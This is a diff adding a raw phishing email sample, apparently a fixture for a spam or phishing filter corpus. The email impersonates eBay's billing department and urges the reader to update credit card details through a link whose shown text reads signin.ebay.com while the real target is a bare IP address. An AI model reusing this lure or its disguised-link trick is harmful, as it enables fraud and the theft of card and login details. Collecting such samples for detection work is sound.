@@ -1,0 +1,90 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id F04272A88C
+ for <user@example.com>; Sun, 19 Feb 2006 02:08:14 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id DEECA621C95; Sun, 19 Feb 2006 02:08:14 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 92736621C92
+ for <user@example.com>; Sun, 19 Feb 2006 02:08:14 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id CAA01232
+ for user@example.com; Sun, 19 Feb 2006 02:08:14 -0500
+Received: from www.theredtag.net (www.theredtag.net [64.136.56.180])
+ by mail.example.com with ESMTP id CAA01224
+ for <user@example.com>; Sun, 19 Feb 2006 02:08:13 -0500
+Received: from test ([195.242.89.110]) (authenticated bits=0)
+ by www.theredtag.net (8.12.8/8.12.8) with ESMTP id k1J77oYg032064;
+ Sat, 18 Feb 2006 23:07:52 -0800
+Message-Id: <200602190707.k1J77oYg032064@www.theredtag.net>
+Reply-To: <no-reply@ebay.com>
+From: "eBay" <service@ebay.com>
+Subject: Service eBay
+Date: Mon, 17 May 2004 09:10:03 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1250"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 5168
+Lines: 49
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 308
+
+
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR vAlign=top>
+<TD width=600 bgColor=#d6dcfe><FONT face="Arial, &#10;Helvetica,&#10;sans-serif   " size=3><STRONG><FONT face=Verdana>Place or Update Credit Card on File</FONT></STRONG></FONT>&nbsp;</TD>
+<TD width=200 bgColor=#d6dcfe>
+<DIV align=right><IMG height=18 src="http://pics.ebaystatic.com/aw/pics/aboutme/v3/ebay_logo_39x18.gif" width=39></DIV></TD></TR>
+<TR>
+<TD bgColor=#d6dcfe colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#9999cc colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR></TBODY></TABLE><BR>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD vAlign=top width=600>
+<P align=center><FONT face="Arial, Helvetica, sans-serif   " size=2>Dear <STRONG>eBay </STRONG>member,<BR><BR>During our regularly schedule account maintenance and verification we have detected a slight error in your billing information on file with eBay. </FONT></P>
+<P align=center><FONT face="Arial, Helvetica, sans-serif" size=2>Your card will be used for identification only and will not be charged at any time. By having this type of identification from all users, eBay remains a safe place to buy and sell. Setting up a seller account necessitates valid credit or debit card and checking account information.</FONT></P>
+<P align=center><FONT face="Arial, Helvetica, sans-serif" size=2>For automatic payments, your credit card will normally be charged 5 to 7 days after you receive your invoice. Enter and submit the required information. Your account may be suspended for non-payment, and you may be responsible for collection costs.</FONT></P>
+<P align=center><FONT face="Arial, Helvetica, sans-serif   " size=2>If you don't want to place your card on file, you can enter a different email instead (only certain types of emails can be used, such as those issued by companies, schools, and paid Internet Service providers).</FONT><FONT face="Arial, Helvetica, sans-serif   " size=-1><BR></FONT></P>
+<DIV align=center>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD bgColor=#cccccc colSpan=3 height=2><IMG title="" height=2 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR>
+<TR bgColor=#f4f4f4>
+<TD width=2 bgColor=#cccccc rowSpan=2><IMG title="" height=1 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=2></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="20%"><FONT face="Arial Black" size=2>Your credit card on file with eBay</FONT></TD>
+<TD width="60%">&nbsp;</TD>
+<TD noWrap align=right width="20%">&nbsp;</TD></TR></TBODY></TABLE></TD>
+<TD width=2 bgColor=#cccccc rowSpan=2><IMG title="" height=1 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=2></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="20%"><FONT face=arial size=2>Card number: XXXX-XXXX-XXXX-XXXX (Not shown for security purposes)</FONT>&nbsp;</TD>
+<TD width="60%"></TD>
+<TD noWrap align=right width="20%"><FONT face="Arial, &#10;Helvetica,&#10;sans-serif   " size=2>Expiration date: 05/07</FONT> </TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=#cccccc colSpan=3 height=2><IMG title="" height=2 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR></TBODY></TABLE></DIV>
+<P align=center><FONT size=2><FONT face=Arial>Please sign in to your eBay account and update your billing information:</FONT><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR></FONT><IMG height=20 src="
+://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR><FONT size=2><FONT face="Arial, &#10;Helvetica, sans-serif   "><A title=http://64.136.208.227/ebay/eBayISAPI.htm onclick="return ShowLinkWarning()" href="http://64.136.208.227/ebay/eBayISAPI.htm " target=_blank onfiltered="return ShowLinkWarning()"><FONT color=#003399>http://signin.ebay.com/eBayISAPI.dll?SignIn&amp;ssPageName=h:h:sin:US <FONT face=arial size=2></FONT></FONT></A><FONT color=#003399></FONT></FONT></FONT></P>
+<P align=center><FONT size=2><FONT size=2><FONT face="Arial, Helvetica, sans-serif   "><FONT color=#003399><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0></FONT>If your account information is not update, your ability to sell or bid on eBay will become restricted. <STRONG>Remember:</STRONG> Your personal information is protected by eBay's <A title=http://pages.ebay.com/help/community/png-priv.html href="http://mail.yahoo.com/config/login?/_javascript:dl('http://pages.ebay.com/help/community/png-priv.html',1);" target=_blank><FONT color=#003399>Privacy Policy</FONT></A>. and encrypted by the industry standard SSL software.<BR></FONT><FONT face="Arial, Helvetica,&#10;sans-serif   "><STRONG></FONT></FONT></FONT></P>
+<P align=center><FONT face="Arial, Helvetica, sans-serif" size=2>Thank you,</FONT><FONT size=2><FONT face=Arial><FONT size=2><BR>eBay Billing Department</FONT><BR></FONT></FONT></P></STRONG></TD></TR></TBODY></TABLE>
+<DIV></DIV>
